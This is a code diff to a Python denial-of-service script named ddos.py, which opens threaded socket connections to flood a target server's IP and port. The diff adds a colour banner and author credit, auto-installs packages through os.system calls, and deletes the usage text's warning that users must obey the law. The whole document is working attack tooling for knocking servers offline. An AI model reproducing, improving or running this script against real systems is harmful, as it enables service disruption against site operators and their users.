@@ -1,7 +1,14 @@
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
-
+import time,sys,socket,os,threading,logging,urllib.request,random
+try:
+  import requests
+  import colorama
+except:
+  os.system('pip install colorama')
+  os.system('pip install requests')
+from colorama import init, Fore, Back, Style 
+print(Style.BRIGHT)
 def user_agent():
 	global uagent
 	uagent=[]
@@ -41,7 +48,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent!--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sending! Ctrl+Z for stop--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -67,17 +74,30 @@ def dos2():
 
 
 def usage():
-	print (''' \033
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 ddos.py [-s] [-p] [-t]
+	print ('''
+	usage : python/python3 ddos.py [-s] [-p] [-t]
 	-h : help
 	-s : server ip
 	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	-t : turbo default 135 ''')
 	sys.exit()
 
 
+os.system('clear')
+logo = str(Fore.GREEN+'''
+           _  _____ ________   __   __ ___  
+     /\   | |/ /__ \____  \ \ / /  / // _ \ 
+    /  \  | ' /   ) |  / / \ V /  / /| (_) |
+   / /\ \ |  <   / /  / /   > <  | '_ \__, |
+  / ____ \| . \ / /_ / /   / . \ | (_) |/ / 
+ /_/    \_\_|\_\____/_/   /_/ \_(_)___//_/  
+                                            
+                                            ''')
+Author=(Back.GREEN+Fore.WHITE+'\n\t [Author]~MOHAMMAD ALAMIN'+Style.RESET_ALL)
+print(logo+Author)
+print(Fore.YELLOW+'='*44)
+
+print(Fore.RED)
 def get_parameters():
 	global host
 	global port
